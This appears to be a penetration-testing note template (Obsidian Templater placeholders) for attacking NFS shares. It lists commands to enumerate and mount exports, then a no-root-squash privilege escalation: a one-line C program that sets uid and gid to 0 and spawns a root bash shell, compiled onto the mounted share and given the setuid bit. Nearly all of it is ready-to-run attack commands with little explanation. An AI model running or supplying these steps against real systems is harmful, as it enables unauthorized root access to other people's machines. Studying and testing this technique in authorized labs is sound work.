# NFS - <% tp.frontmatter.current_port %>

### Show available mounts
```bash
showmount -e <% tp.frontmatter.target_ip %>
```

### Mount 
```bash
sudo mount -t nfs -o nolock,nfsvers=3 <% tp.frontmatter.target_ip %>:/<target_share> <local_folder>
```

### No Root squashing
This sometimes works to escalate privileges 

Create `.c` file
```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > ./x.c
```

compile and save to mounted drive
```bash
sudo gcc ./x.c -o <mount/location>/x
```

```bash
sudo chmod +s </mount/location>/x
```

